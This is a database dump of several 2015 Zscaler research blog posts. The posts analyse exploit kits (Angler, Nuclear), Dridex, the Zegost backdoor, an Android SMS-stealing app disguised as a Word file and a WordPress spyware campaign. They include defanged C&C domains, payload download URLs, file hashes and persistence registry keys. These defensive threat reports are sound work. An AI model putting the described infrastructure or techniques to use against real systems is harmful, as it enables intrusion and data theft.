\r\n	\r\n\r\nOutside of these changes, the functionality of the landing page appears unchanged, and the goal is naturally to serve up a malicious SWF:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 5. Decoded landing page SWF objects\r\n		\r\n	\r\n\r\n\r\nMalicious SWF - CVE-2015-7645\r\nKafeine already broke the news that Angler is exploiting Flash 19.0.0.207, and we can corroborate that with the samples we\'ve observed.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 6. Flash 19.0.0.207 being exploited\r\n		\r\n	\r\n\r\nIn fact, we compared the sample from his recent post with one obtained from this infection and the structure is identical, with very few changes in the actionscript. The biggest change we saw was in the embedded binary data.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 7. SWF structure, 30-Oct sample on the left, Kafeine\'s sample on the right\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 8. Comparison of binary data, 30-Oct sample on the left, Kafeine\'s sample on the right\r\n		\r\n	\r\n\r\n\r\nUpon successful exploit cycle, a new CryptoWall 3.0 variant from the crypt13 campaign is downloaded and installed on the target machine. The image below shows a decrypted Command & Control (C&C) communication message from the CryptoWall variant which also contains the total number of files encrypted on the target system:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 9. CryptoWall 3.0 C&C message reporting encrypted file count\r\n		\r\n	\r\n\r\n\r\n\r\nFinal Thoughts\r\nAs stated, this seems to be business as usual for Angler EK operators. While these attacks were not targeted in nature, this is the first instance where we saw EK operators leveraging a government site to target end users. One interesting observation is that we no longer see any Diffie-Helman POST exchange to prevent replaying captured sessions for offline analysis. Additionally, there was a much larger number of C&C servers than we\'ve previously observed, and some of the domain names seem to suggest multi-use hosts (e.g.: spam, bitcoin mining, etc). Note that none of the C&C servers are pseudo-randomly generated domains. ThreatLabZ will continue to track new developments with the Angler Exploit Kit.\r\n \r\nIndicators of Compromise\r\n\r\n\r\n\r\n	\r\n		\r\n			Domain\r\n			IP Address\r\n			Description\r\n		\r\n		\r\n			cxda.gov[.]cn\r\n			118.123.7.122\r\n			Chinese government site\r\n		\r\n		\r\n			erteilend-taendelt.sewnydine[.]com\r\n			104.129.192.32\r\n			Angler Domain\r\n		\r\n		\r\n			repersuasionboldoblique.classactoutlet[.]com\r\n			104.129.192.32\r\n			Angler Domain\r\n		\r\n		\r\n			ayh2m57ruxjtwyd5.stopmigrationss[.]com\r\n			95.128.181.195\r\n			Payment Server\r\n		\r\n		\r\n			ayh2m57ruxjtwyd5.starswarsspecs[.]com\r\n			failed\r\n			Payment Server\r\n		\r\n		\r\n			ayh2m57ruxjtwyd5.malerstoniska[.]com\r\n			109.70.26.37,194.85.61.76\r\n			Payment Server\r\n		\r\n		\r\n			ayh2m57ruxjtwyd5.blindpayallfor[.]com\r\n			95.128.181.195\r\n			Payment Server\r\n		\r\n		\r\n			flat.splo1t[.]ru\r\n			188.127.239.164\r\n			C&C connections\r\n		\r\n		\r\n			sanliurfapastanesi[.]com\r\n			95.173.190.210\r\n			C&C connections\r\n		\r\n		\r\n			wesalerx[.]xyz\r\n			46.148.18.100\r\n			C&C connections\r\n		\r\n		\r\n			urfakaplanticaret[.]com\r\n			95.173.190.210\r\n			C&C connections\r\n		\r\n		\r\n			taigastyle[.]ru\r\n			37.140.192.180\r\n			C&C connections\r\n		\r\n		\r\n			flickstudio[.]com\r\n			103.21.59.22\r\n			C&C connections\r\n		\r\n		\r\n			mydaycarewebsite[.]com\r\n			104.24.102.98,104.24.103.98\r\n			C&C connections\r\n		\r\n		\r\n			sampiyonvitamin[.]com\r\n			95.173.190.210\r\n			C&C connections\r\n		\r\n		\r\n			xmest.web-zolotareva[.]ru\r\n			82.146.36.185\r\n			C&C connections\r\n		\r\n		\r\n			aandwrentalspm[.]com\r\n			142.4.6.13\r\n			C&C connections\r\n		\r\n		\r\n			orucogluelektronik[.]com\r\n			95.173.190.210\r\n			C&C connections\r\n		\r\n		\r\n			gaja24[.]pl\r\n			91.234.146.241\r\n			C&C connections\r\n		\r\n		\r\n			developmysuccess[.]com\r\n			50.30.46.201\r\n			C&C connections\r\n		\r\n		\r\n			20dollarhomebusiness[.]com\r\n			50.30.46.201\r\n			C&C connections\r\n		\r\n		\r\n			rizvanogluhafriyat[.]com\r\n			95.173.190.210\r\n			C&C connections\r\n		\r\n		\r\n			sanliurfapastanesi[.]com\r\n			95.173.190.210\r\n			C&C connections\r\n		\r\n		\r\n			newatena[.]com\r\n			95.173.190.210\r\n			C&C connections\r\n		\r\n		\r\n			stalkerbanget[.]com\r\n			68.65.120.182\r\n			C&C connections\r\n		\r\n		\r\n			primevisionstudio[.]com\r\n			192.185.206.97\r\n			C&C connections\r\n		\r\n		\r\n			i-tem[.]ru\r\n			62.173.143.242\r\n			C&C connections\r\n		\r\n		\r\n			localuzzweb[.]com\r\n			143.95.32.179\r\n			C&C connections\r\n		\r\n		\r\n			getpostivemind[.]com\r\n			158.85.170.253\r\n			C&C connections\r\n		\r\n		\r\n			zemli72.chaukakau[.]ru\r\n			62.173.143.242\r\n			C&C connections\r\n		\r\n		\r\n			grandmedianetwork[.]com\r\n			111.118.215.77\r\n			C&C connections\r\n		\r\n		\r\n			karakoprudugunsalonu[.]com\r\n			95.173.190.210\r\n			C&C connections\r\n		\r\n		\r\n			sanliurfaparke[.]com\r\n			95.173.190.210\r\n			C&C connections\r\n		\r\n		\r\n			nsdstudio[.]net\r\n			192.185.206.97\r\n			C&C connections\r\n		\r\n		\r\n			meble-simone[.]eu\r\n			91.234.146.241\r\n			C&C connections\r\n		\r\n		\r\n			vsedveri33[.]ru\r\n			81.177.165.33\r\n			C&C connections\r\n		\r\n		\r\n			osk-wojcikiewicz[.]pl\r\n			91.234.146.241\r\n			C&C connections\r\n		\r\n		\r\n			love-deep[.]com\r\n			111.118.215.77\r\n			C&C connections\r\n		\r\n		\r\n			turizmkirov[.]ru\r\n			82.146.36.185\r\n			C&C connections\r\n		\r\n		\r\n			new.turizmkirov[.]ru\r\n			82.146.36.185\r\n			C&C connections\r\n		\r\n		\r\n			avtoreliv[.]com.ua\r\n			91.234.34.80\r\n			C&C connections\r\n		\r\n		\r\n			localwebsitepro[.]com\r\n			192.185.41.191\r\n			C&C connections\r\n		\r\n		\r\n			makrol[.]net\r\n			91.234.146.241\r\n			C&C connections\r\n		\r\n		\r\n			altopics[.]com\r\n			111.118.215.77\r\n			C&C connections\r\n		\r\n		\r\n			burnfatquicky[.]com\r\n			184.168.221.57\r\n			C&C connections\r\n		\r\n		\r\n			mediaopt33[.]ru\r\n			81.177.165.33\r\n			C&C connections\r\n		\r\n		\r\n			otmanad[.]com\r\n			91.234.146.241\r\n			C&C connections\r\n		\r\n		\r\n			markossolomon[.]com\r\n			104.27.181.171,104.27.180.171\r\n			C&C connections\r\n		\r\n		\r\n			kominki-gorlice[.]pl\r\n			91.234.146.241\r\n			C&C connections\r\n		\r\n		\r\n			chaukakau[.]ru\r\n			62.173.143.242\r\n			C&C connections\r\n		\r\n		\r\n			crm.ruhtech[.]com\r\n			202.160.165.21\r\n			C&C connections\r\n		\r\n		\r\n			takas3aya.xsrv[.]jp\r\n			183.90.232.25\r\n			C&C connections\r\n		\r\n		\r\n			famouswhiskybrands[.]com\r\n			103.21.59.21\r\n			C&C connections\r\n		\r\n		\r\n			edwardbrownjr[.]com\r\n			50.30.46.201\r\n			C&C connections\r\n		\r\n		\r\n			avatar77[.]ru\r\n			62.173.143.242\r\n			C&C connections\r\n		\r\n		\r\n			bollywoodupdate[.]net\r\n			95.173.190.210\r\n			C&C connections\r\n		\r\n		\r\n			asiaroyaldeveloper[.]com\r\n			103.21.59.22\r\n			C&C connections\r\n		\r\n		\r\n			asattyres[.]com\r\n			192.185.206.97\r\n			C&C connections\r\n		\r\n		\r\n			records.karika[.]in.ua\r\n			91.234.34.80\r\n			C&C connections\r\n		\r\n		\r\n			ppcprofitz[.]com\r\n			143.95.32.180\r\n			C&C connections\r\n		\r\n		\r\n			ecodeva[.]ru\r\n			62.173.143.242\r\n			C&C connections\r\n		\r\n		\r\n			btcdoubler[.]biz\r\n			failed\r\n			C&C connections\r\n		\r\n		\r\n			18dollars1time[.]info\r\n			50.30.46.201\r\n			C&C connections\r\n		\r\n		\r\n			urfaeleganceoptik[.]com\r\n			95.173.190.210\r\n			C&C connections', 'Exploit Kit;Ransomware;Vulnerability', 'https://www.zscaler.com/blogs/research/chinese-government-website-compromised-leads-angler');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (122, 'Infostealer APK Posing As Microsoft Word Document', 'Shivang Desai', 'October 29, 2015', 'Recently, we came across a piece of Android malware which was neither a porn app nor a battery status app, but was instead designed to look like a Microsoft Word document. This malicious app portrays itself as a document with an icon resembling Microsoft Word.    Due to the ubiquitous nature of mobile devices, its no wonder that PC based malware techniques are appearing in mobile domains. In early Windows malware attacks, attackers would often name the malicious files with eye-catching titles and use common icons to entice victims to open the file. We\'re seeing this same practice used for Android based malware.    Overview:  The malware portrays itself as a data file with an icon similar to that used by Microsoft Word documents and is entitled \'资料\' (Data). It runs with Administrative access and hence cannot be easily uninstalled. Once installed, the malware scans the device for SMS messages and other personally identifiable information such as the IMEI number, SIM card number, Device ID, victim\'s contact information,  etc. and sends this to the attacker via email.       	  		  			  		  		  			Malicious APK posing as Microsoft Word File  		  	        Technical Details:  Once the malware is installed, it appears on the Android home screen as shown below:       	  		  			  		  		  			Microsoft Word Icon  		  	        Initiation:  As soon as victim tries to start the app, it shows an explicit error stating \"Installation errors, this software is not compatible with the phone\" and the icon then disappears from the device screen.       	  		  			  		  		  			Fake Error Message  		  	        When this error is being displayed, the app executes a few major functions as noted below:    	Sends SMS messages to a hard-coded number.  	Starts an Android service, named MyService.  	Starts an asynchronous thread (SmsTask) which runs in background.  	Starts another thread named MailTask, which also operates in background.  	Calls phone numbers specified by Attacker.           Sends SMS  Initially malware tries to send the victim\'s device IMEI code in a message body to a hardcoded number.            	  		  			  		  		  			Calling SendMsg function  		  	        Assets.getInstallFlag gets the IMEI (or ESN number in case of CDMA devices)         	  		  			  		  		  			IMEI code fetching  		  	      And finally sends the message.            	  		  			  		  		  			Sending Message  		  	      MyService Service:  The main task performed by MyService is to collect all the SMS messages from inbox of the victim\'s device.  Once that is done, it stores all the messages in its local logs.       	  		  			  		  		  			Service fetching inbox messages  		  	      SmsTask Thread:  Apart from logging SMS messages, MyService was not sending these messages anywhere. This functionality is exhibited in the SmsTask thread.    SmsTask will also read the SMS messages and exfiltrates them.       	  		  			  		  		  			Fetching inbox messages  		  	      Once the messages are collected, the app then sends them to attacker via email.    	  		  			  		  		  			Calling SendMail method  		  	      A username and password for an email id were found hard-coded in the malware.       	  		  			  		  		  			SendMail functionality  		  	      MailTask Thread:  MailTask\'s main role is to collect contact information from the victim\'s device and send it to attacker via the same functionality explained in case of SmsTask.         	  		  			  		  		  			SmsTask Thread  		  	      Sending Mail:  The app sets up an SMTP host on port 465 for sending email.       	  		  			  		  		  			Sending Mail  		  	      localMimeMessage contains the necessary data to be sent to attacker via email. In the case of SmsTask as mentioned above, localMimeMessage\'s body contains an SMS message list and in the MailTask instance, it contains contact numbers from victim\'s device.    Calling Functionality:  The malware was also designed to call phone numbers provided by an attacker via SMS.  It has a broadcast receiver registered to trigger whenever a new SMS is delivered.  The malware reads the SMS received from the attacker and acts accordingly.    In one instance, malware was trying to fetch phone numbers received in SMS messages and then calling them, as shown in screenshot below:       	  		  			  		  		  			Broadcast Receiver  		  	      We were able to confirm that the campaign was initiated on October 10, 2015 and almost 300+ users had fallen prey to this malware. The attacker was able to successfully retrieve message details and contact lists from the infected users.    The following screenshots shows the list of emails received by the attacker:       	  		  			  		  		  			Inbox  		  	      Further, each email titled \"Message list\" consists of full SMS conversations from the victims phones and email with subject \"Contact list\" contains a list of all the phone numbers fetched from victims contact diaries.       	  		  			  		  		  			Messages from victim\'s device  		  	           	  		  			  		  		  			Contacts from victim\'s phone  		  	    There were 300+ such emails found in the C&C admin panel. Such malware creates a significant privacy & financial risk as it obtains contact information and private SMS messages.    Prevention:  It is recommended that users download apps only from official Android stores like the Google Play store. If you are infected with malware, you can follow the steps mentioned in our previous blog for removing the malicious app.', 'Malware;Mobile;Mobile Malware', 'https://www.zscaler.com/blogs/research/infostealer-apk-posing-microsoft-word-document');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (123, 'Dridex Activity Continues', 'Tarun Dewan', 'October 27, 2015', 'Dridex, a banking malware which attempts to steal the victim\'s banking credentials and system information, continues to remain active in the wild after the recent takedown attempt. Dridex activity went down significantly in September after the takedown operation but we started seeing an uptick in the number of samples in our sandboxes starting early October 2015.    Dridex is distributed via e-mail with a Microsoft Office attachment that leads to the download and installation of the Dridex Trojan executable. The e-mail attachments in these campaigns varied from regular Microsoft Office document files to MHTML files as seen in Figure 1.       	  		  			  		  		  			Figure 1: Malicious document sent in MHTML format  		  	    MHTML, also known as MIME HTML, is a web page archive format used to combine in a single document the HTML code and its companion resources that are otherwise represented by external links (such as images, Flash animations, Java applets, and audio files). The malware authors are known to send the documents containing malicious macro in MHTML format to evade antivirus detection.    The content of the embedded macro was both obfuscated and protected using a basic password that is intended to prevent modification of the macros.  We were able to bypass the password protection and extract the various document components by standard means.    Figure 2 shows an example embedded malicious macro that downloads the Dridex executable from a predetermined server:       	  		  			  		  		  			Figure 2: Embedded malicious macro to download Dridex  		  	    The samples we are seeing in these new campaigns are a mix of unsigned as well as some digitally signed using valid certificates. The format of the URLs hosting the signed Dridex samples changed to 195.37.231[.]2:8080/uniq/load[.]php instead of previously seen URL format 94.250.252[.]13/bt/bt/stata[.]php       The Dridex executable downloaded by above macro (Figure 2) appears to be packaged using a custom packer. This instance of the Dridex Trojan is signed using a certificate with the common name of “Favorite-III” which appears specific to the Dridex malware and which is currently also present in Comodo’s Certificate Revocation List.         	  		  			  		  		  			Figure 3: Dridex Certificate issued with CN Favorite-III  		  	      We also saw following additional certificates used to sign the newer Dridex executables:    	INTEX  	KASHTAN OOO  	Promtorg  	KONSALTING PLUS OOO  	Brand IT   	AVTOZVIT Scientific Production Private Company  	Afet  	3 AM CHP  	PJSC \"BIZNES AVTOMATYKA\"  	Favorite-III  	Private Person Parobii Yuri Romanovich  	SWIFT Weather  	PJSC \"BIZNES AVTOMATYKA  	AVTOZVIT Scientific Production Private Company  	Private Person Parobii Yuri Romanovich  	Favorite-III [NEW - seen in October 2015]  	promtorg  [NEW - seen in October 2015]         The following are some recent URLs from which Dridex executables were downloaded:      	93.170.104.168:443/uniq/load[.]php  	178.62.7.183:443/uniq/load[.]php  	195.37.231.2:443/uniq/load[.]php  	5.2.199.30:8080/uniq/load[.]php  	113.30.152.165:8080/uniq/load[.]php  	168.243.33.195:8080/uniq/load[.]php  	199.175.55.116:8080/uniq/load[.]php    The following are some MD5 sums of signed and unsigned Dridex executables that we have encountered in past month:    Signed    82BB00DCAC6411669CE6AE5A60CBB3B3  9D4225ECDCDA7FE9A5EAE48601919114  2485C741AF50DE986079B6AD9B6C948A  290CD720AECF28773960C8E41172513C  1C21AEB3DC0E30E05630A3F61AAE83F9  0DA24BD7B49A955D8E4624371CCB8E9F  AFADE4E50D147A1FE18ACA8942E3E679    Unsigned    1DE3889FDE95E695ADF6EADCB4829C6D  D7A31449E5F808FDBA0F6D3CF0D6E91C  7519F0D9D5C3B8D072FFCA7DDF213DDA  F2D6DEC39DAEF7ED90AAABB725590B02    Following are the statistics of Dridex executable downloads that we have seen in past six weeks:       	  		  			  		  		  			  			  				  					  						Figure 4: Dridex executable downloads in past six weeks  					  				  			  			  		  	           	  		  			  		  		  			  			  				  					  						Figure 5: Dridex executable hosting servers  					  				  			  			  		  	           Conclusion  Dridex infections went down considerably after the global takedown operation but we are starting to see a steady increase in the infections this month, which indicates the malware gang\'s attempt at resurrecting this highly lucrative Botnet. The authors continue to use the tactic of digitally signed malware executable to evade detection with legitimate certificates created specifically for this purpose.    Zscaler ThreatLabZ is actively monitoring this Botnet and ensuring that Zscaler customers are protected.                                           Research by Tarun Dewan and Nirmal Singh', 'Malware', 'https://www.zscaler.com/blogs/research/dridex-activity-continues');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (124, 'Chinese Backdoor Zegost Delivered Via Hacking Team Exploit', 'Deepen Desai', 'October 16, 2015', 'Introduction  Zscaler ThreatLabZ has been closely monitoring the usage of Hacking Team\'s leaked exploits in the wild since July, 2015 and recently uncovered the Emissary Panda APT attack leveraging these exploits. In past two months, we\'ve spotted multiple instances of Zegost Backdoor Trojan installation attempts leveraging Hacking Team\'s Adobe Flash exploit (CVE-2015-5119) payload. These attacks do not appear to be targeted, but the payload involved in the infection cycle has some resemblance to recent APT payloads from HttpBrowser & the PlugX RAT family.    Attack Chain  The infection cycle starts with a legitimate Chinese real estate and shopping site www[.]kongquechang[.]com, which appears to have been compromised by the attackers and contains an injected script. The injected script will cause a series of redirects leading to Hacking Team\'s exploit payload as seen in Figure 1. The majority of users were led to the original compromised site following a Baidu search.       	  		  			  		  		  			Figure 1: Compromised Chinese real estate & shopping site  		  	    The site www[.]kongquecheng[.]com is still infected but the exploit server appears to be down at the time of writing this blog. Attackers are abusing the Chinese URL shortening service t.cn to redirect victims to the attack server and also Baidu\'s URL shortening service dwz.cn to deliver the Adobe Flash exploit payload as seen below:       	  		  			  		  		  			  			  				  					  						Figure 2: Zegost Backdoor Attack Chain  					  				  			  			  		  	         The Flash exploit payload (CVE-2015-5119) involved here is from the Hacking Team\'s leaked archive with updated shellcode. Upon successful exploitation, the embedded shellcode will trigger the download and execution of the Zegost executable from a predetermined location.       	  		  			  		  		  			Figure 3: Hacking Team\'s Adobe Flash Exploit  		  	           	  		  			  		  		  			Figure 4: Embedded shellcode to download & install Zegost  		  	      Zegost Payload Iterations  During the course of our monitoring we observed the attackers switch the malware payload multiple times.    Payload Type #1 - APT RAT like Zegost Installer    Filename:  svhost.exe    MD5:  E04F3C9C2F7BE694628AECCD23E8839D    The Zegost payload was being delivered as part of an installer archive, which is similar in structure to the APT RAT PlugX and HttpBrowser as detailed here. The downloaded installer was svhost.exe, which has following file structure:       	  		  			  		  		  			Figure 5: APT RAT like Zegost installer archive  		  	    The Zegost installer is responsible for dropping the above three files and running the legitimate Ping_Master_Pro utility DATA.exe. The legitimate binary contains the data.dll in the import table, ensuring that the DLL will be loaded before it runs. The data.dll that gets loaded in this case, will be a fake VirtualBox display driver DLL file present in the same directory and it will patch the entry point of the main executable (DATA.exe) file with a jump instruction to run the DLL’s code instead. This technique is also known as DLL Hijacking which ensures that the fake display driver DLL gets loaded by abusing the Windows DLL load order. The DLL’s code is responsible for decrypting and running the Zegost Backdoor payload from the fafentuqiang.png file in the same memory space of the benign executable.    We observed a bug in the persistence module for this payload, which resulted in an incorrect path getting added to the registry entry created by the malware. The result was that upon system reboot the user\'s machine will no longer be infected with the Backdoor Trojan.    Payload Type #2 - Vanilla Zegost    Filename:  svhost.exe    MD5:  8F3B2C449793BC1538328CCC9BDC9CCD  62C705A0232EA6D4E3E3CE93F7506ACC    A modified Zegost payload was being delivered in decrypted form abandoning the installer archive structure. This payload was recently compiled and purports to be a XLLuaRuntime Dynamic Link Library file as seen below:       	  		  			  		  		  			Figure 6: Recently compiled Zegost payload  		  	             	  		  			  		  		  			Figure 7: Zegost payload file meta data  		  	    During our analysis we noticed that the persistence issue that existed in the previous iteration was resolved in this payload and the malware successfully remained active upon system reboot.    Zegost Infection Cycle      	Zegost Trojan drops a copy of itself in the Windows system directory as %SYSTEMDIR%\\Autoexec.exe        	It creates the following registry key to ensure persistence upon system reboot:        HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ Nobug = %SYSTEMDIR%\\Autoexec.exe        	We also saw an alternate code for achieving persistence by registering a new Windows Service:        HKLM\\SYSTEM\\CurrentControlSet\\Services\\        ServiceName - DirectX dwx        DisplayName - DirectX Remover auy for Windows(R).        ImagePath - %SYSTEMDIR%\\Autoexec.exe        	The Trojan reports the infected system information to a predetermined remote server at the following location:        Domain - www[.]svshot[.]com        Server IP - 123.57.54[.]57        Server Port - 8999        	The Command & Control server domain used in this attack was recently registered and points to a dedicated server hosted on the shady Chinese autonomous system - AS37963 (CNNIC-ALIBABA-CN-NET-AP) as seen below:        	  		  			  		  		  			Figure 8: Command & Control server hosted in China  		  	      The same server is also used for the initial Adobe Flash exploitation attempt.    Conclusion  Hacking Team\'s exploit payloads remain a popular choice among cyber criminals for weaponizing their payloads. This is the first instance of the Zegost Backdoor Trojan being delivered using Hacking Team\'s exploit. The Zegost Backdoor payload iterations we observed in this attack chain indicates that the author is testing out new payloads.    Zscaler’s ThreatLabZ has confirmed coverage for these exploits and for the Zegost variants, ensuring protection for organizations using Zscaler’s Internet security platform.    Research by: Deepen Desai, Amandeep Kumar', 'Advertising', 'https://www.zscaler.com/blogs/research/chinese-backdoor-zegost-delivered-hacking-team-exploit');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (125, 'Compromised WordPress Campaign - Spyware Edition', 'Sameer Patil', 'September 25, 2015', '[Update - October 9, 2015]     Multiple Drupal & Joomla sites affected..    The Spyware campaign we wrote about two weeks ago continues to be active, although the number of infected websites has gone down. We are also seeing two other popular Content Management Systems (CMS), Drupal and Joomla sites being compromised and leveraged in this campaign.           	  		  			  		  		  			Spyware campaign hits from last 7 days  		  	           The compromised Joomla and Drupal site pages are injected with identical malicious JavaScript  redirecting users to the download of Spyware and Potentially Unwanted Applications as seen below:           	  		  			  		  		  			Compromised Drupal Site with injected JavaScript  		  	           	  		  			  		  		  			Compromised Joomla Site with injected JavaScript  		  	           Introduction  The Zscaler security research team started investigating multiple WordPress related security events earlier this month and came across a new widespread compromised WordPress campaign leading to the download of unwanted applications. This has been briefly covered by dynamoo and has been reported by some users on official WordPress forums.    During our research, we discovered that this campaign started in the first week of August, 2015 and has been fairly active since then resulting in over 20,000 security events to date from over 2,000 web pages. Majority of the WordPress sites affected by this campaign are running latest version 4.3.1 but the compromise could have occurred prior to the update.         	  		  			  		  		  			Figure 1: August 2015 WordPress Campaign hits  		  	           	  		  			  		  		  			Figure 2: September 2015 WordPress Campaign hits  		  	      Infection Cycle  The infection starts when a user visits a compromised WordPress site. The compromised pages will have injected JavaScript shown below:             	  		  			  		  		  			Figure 3: Injected malicious JavaScript code  		  	             The deobfuscated JavaScript code contains an iframe to the malicious server location:         	  		  			  		  		  			Figure 4: Deobfuscated JavaScript containing the iframe  		  	                Although the target domains varied across the transactions that we saw, the associated server IP address has remained the same.         Target domains seen    c11.n4.i.teaserguide[.]com  i.illuminationes[.]com  c11n4.i.teaserguide[.]com  kfc.i.illuminationes[.]com  kfc.i.teaserguide[.]com  xn--c11n4-ix3b.i.teaserguide[.]com  xn--kfc-rp0a.i.illuminationes[.]com  c114.i.teaserguide[.]com    rm3a.r.mega-us-pills[.]ws         The IP Address 91.226.33.54 associated with these domains is hosted in Latvia through a VPS hosting provider.     The injected iframe loads additional JavaScript that gathers information such as current system timestamp, timezone, and presence of Adobe Flash Player.       	  		  			  		  		  			Figure 5: User system information gathering script  		  	                  	  		  			  		  		  			Figure 6: Function to check the presence of Flash Plugin and version information  		  	                                                                                                The collected information is relayed back to the same server via a HTTP GET request. This is followed by a series of redirects leading to download of spyware or potentially unwanted applications (PUA) masquerading as legitimate applications.       	  		  			  		  		  			Figure 7: Redirects from Latvia VPS server leading to PUA download  		  	                                   Fake Flash Player - Win32.InstallCore    In one of the cases, we observed the user is prompted to update the Flash Player as seen below:           	  		  			  		  		  			Figure 8: Out of date Flash Player warning  		  	    The page prompts the user to update or install a new flash player update. Regardless of the option the user selects, a fake Adobe Flash Player application is downloaded.    FileName : Adobe Flash Player.exe  MD5 : fa75abf137224fc2c60b9b3c35c80a5e    This file is a .NET Compiled executable which downloads and executes another setup file named FlashSetup.exe.    FileName : Flash Setup.exe  MD5: 87234af45b30740309c8bffcdf2167dc           	  		  			  		  		  			Figure 9: Fake Flash Player download  		  	    The downloaded file flashsetup.exe is a variant of Potentially Unwanted Application Win32.InstallCore. During the installation of the Adobe Flash Player, several other websites offering other unwanted scareware applications are displayed. One such case where the spyware installer prompts the user to download and install Windows 7 PC Repair tool is shown below:       	  		  			  		  		  			Figure 8: Scareware Windows 7 Repair utility  		  	             	  		  			  		  		  			Figure 9: Download from third party sites & adware traffic from PUA  		  	      Once the spyware installation is complete, the user is redirected to the legitimate Adobe page indicating that the installation was not successful prompting the user to start over. If the user chooses to start over the installation, Adobe Flash Player will be installed from the genuine Adobe site.       	  		  			  		  		  			Figure 10: User redirected to legitimate Adobe Flash Player  		  	                                                   Fake MediaDownloader update - Win32.DownloadAssistant    In another case, the webpage prompts the user with a fake MediaDownloader software update which is a variant of PUA Win32.DownloadAssistant.    FileName: Setup.exe  MD5: a885f33c308721831498a2ac581bd91c      	  		  			  		  		  			Figure 11: Fake MediaDownloader Update  		  	                The end result is same where a potentially unwanted application is downloaded and installed on the victim machine. These applications have the capability to download additional malicious or unwanted applications.         We also saw instances of fake web browser plugins being downloaded and installed. Below is an example of a Google Chrome Plugin - NewTabTV plus.           	  		  			  		  		  			Figure 12: Fake Google Chrome Plugin download  		  	           The compromised sites involved in this campaign are distributed worldwide and not limited to one particular region.         	  		  			  		  		  			Figure 13: Geo distribution of the compromised WordPress sites - September 2015  		  	                                                  Conclusion  WordPress, being one of the most popular Content Management Systems & Blogging platform, remains an attractive target for cybercriminals. Unlike previous campaigns involving Malware Authors and Exploit Kit operators, the end payload getting served in this campaign involves spyware and potentially unwanted applications. These applications may seem innocuous but can facilitate malvertising based attacks through unsolicited advertisements.      Zscaler ThreatLabZ is actively monitoring this campaign and ensuring that Zscaler customers are protected.     Analysis by Jithin Nair and Sameer Patil', 'Adware;Compromise;Malware', 'https://www.zscaler.com/blogs/research/compromised-wordpress-campaign-spyware-edition');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (126, 'An Update On Nuclear (Reverse) Engineering', 'Ed Miles', 'September 23, 2015', 'Introduction\r\nAlthough Angler continues to be the leading exploit kit, Nuclear is a significant threat to web surfers and seems to have been very active lately. ThreatLabZ recently encountered a Nuclear campaign originating from a variety of compromised sites. These compromises continue the trend of WordPress sites serving malcode, and in this case included the web-presence of a UK-based healthcare organization.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Example of recent Nuclear landing page to exploit cycle\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\nThe execution flow of this campaign is typical: an infected site includes an embedded iframe that loads the exploit kit landing page. The landing page checks the browser family and version and tests the available Flash version before choosing one of several exploit payloads. From here, multiple possible payloads may be downloaded, particularly Fareit Infostealer Trojan and Troldesh Ransomware Trojan.\r\n \r\nNuclear Landing\r\nAs covered recently, WordPress continues to be one of the most effective traffic sources for exploit kits. However, the majority of traffic we have seen does not feature the visitorTracker component, but merely includes a hidden iframe in the footer of the WordPress page.\r\n \r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			The malicious iframe is preceded by a large number of blank lines\r\n		\r\n	\r\n\r\n\r\n\r\nThe iframe loads the landing page, which features obfuscated JavaScript and random-looking text blocks. It turns out that some of the random looking text blocks are actually obfuscated components that the JavaScript eventually deobfuscates and executes.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Lines 7 and 9 are overlaid with the script invocations that decode the HTML blocks\r\n		\r\n	\r\n\r\n \r\n\r\nNuclear Exploit Payloads\r\nThe landing pages we evaluated led to two possible Flash exploits as well as one Internet Explorer exploit. Specifically, we saw CVE-2015-5122 and CVE-2015-5560 exploits for Flash, and a highly obfuscated CVE-2014-6332 exploit for IE.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			The first Flash payload stage checks Flash Player version and prepares the appropriate exploit\r\n		\r\n	\r\n\r\n\r\nAs noted by Kafeine, Nuclear has integrated the same Diffie-Hellman Angler first pioneered, only now it is implemented in Flash to protect the CVE-2015-5560 payload. This campaign also features an XTEA function with modified constants.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			A Diffie-Hellman key exchange implementation is used to protect the new Flash payload\r\n		\r\n	\r\n\r\n\r\nBesides making reverse engineers lives harder, the authors have also decided to include some friendly shoutouts to those analyzing their code. In the case of the featured Flash payloads, the string \"fuckAV\" is used as a special constant.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			This function returns an XOR key when \"fuckAV\" is supplied as a parameter\r\n		\r\n	\r\n\r\n\r\nNuclear Fallout\r\nOnce the browser is exploited, Nuclear first drops a Fareit payload. Fareit is an infostealer, and as can be seen in the strings below, is looking to steal user credentials for multiple applications and websites as well as BitCoin wallet information.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			A sample of the files and paths Fareit checks for user credentials\r\n		\r\n	\r\n\r\n\r\n\r\nWhile stealing users information, Fareit attempts to hide its command and control communication by sending its check-in request in the midst of a batch of HTTP requests to innocuous looking websites.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			After checking connectivity on MSN.com, multiple POSTs are performed\r\n		\r\n	\r\n\r\n\r\nIn addition to the Fareit payload, a Troldesh ransomware payload was also seen. Troldesh is yet another in the line of ransomware families that encrypt user files and attempt to extract a ransom payments in exchange for decryption keys. This campaign is using the email addresses files100005(at)gmail.com and files100006(at)gmail.com and the Tor address a4yhexpmth2ldj3v.onion.\r\n\r\n 